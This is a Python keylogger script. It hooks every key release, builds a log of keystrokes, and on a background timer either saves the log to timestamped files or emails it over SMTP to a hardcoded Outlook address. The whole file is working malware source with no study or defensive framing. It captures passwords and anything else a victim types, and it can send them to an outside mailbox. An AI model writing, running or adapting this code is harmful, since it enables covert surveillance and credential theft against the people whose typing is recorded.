import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

report_time = 30  # send report every 60 sec
Email_address = 'omar.alsabahi@outlook.com'
Password = ''

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.stop_date = datetime.now()
        self.timer = None

    def call_back(self, action):
        key_name = action.name

        # Check if the key name represents a special key
        if len(key_name) > 1:
            special_key_mapping = {
                "space": " ",
                "enter": "[Enter]\n",
                "decimal": "."
            }

            # Use the mapped representation if available, else format the key name
            formatted_key = special_key_mapping.get(key_name, f"[{key_name.replace(' ', '_').upper()}]")
        else:
            # For regular keys, use the key name directly
            formatted_key = key_name

        # Append the formatted key to the log
        self.log += formatted_key

    def file_name(self):
        # Format start and end date names with clear labels
        start_date_name = self.start_date.strftime("%Y-%m-%d_%H-%M-%S")
        end_date_name = self.stop_date.strftime("%Y-%m-%d_%H-%M-%S")

        # Construct the filename with a clear prefix and timestamp
        self.filename = f"keylog_{start_date_name}_to_{end_date_name}.txt"

    def save_in_file(self):
        with open(self.filename, "w") as f:
            print(self.log, file=f)
        print(f"saved in {self.filename}")

    def e_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = Email_address
        msg["To"] = Email_address
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def send_email(self, email, password, message):
        try:
            server = smtplib.SMTP(host="smtp.office365.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, self.e_mail(message))
            server.quit()
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
        except Exception as e:
            print(f"Error sending email: {e}")

    def report(self):
        if self.log:
            self.stop_date = datetime.now()
            self.file_name()
            if self.report_method == "email":
                self.send_email(Email_address, Password, self.log)
            elif self.report_method == "file":
                self.save_in_file()
            print(f"Report generated - Filename: {self.filename}")
            self.start_date = datetime.now()
        self.log = ""
        self.timer = Timer(interval=self.interval, function=self.report)
        self.timer.daemon = True
        self.timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.call_back)
        self.report()
        print(f"{datetime.now()} - Started at")

if __name__ == "__main__":
    keylogger = Keylogger(interval=report_time, report_method="file")
    keylogger.start()
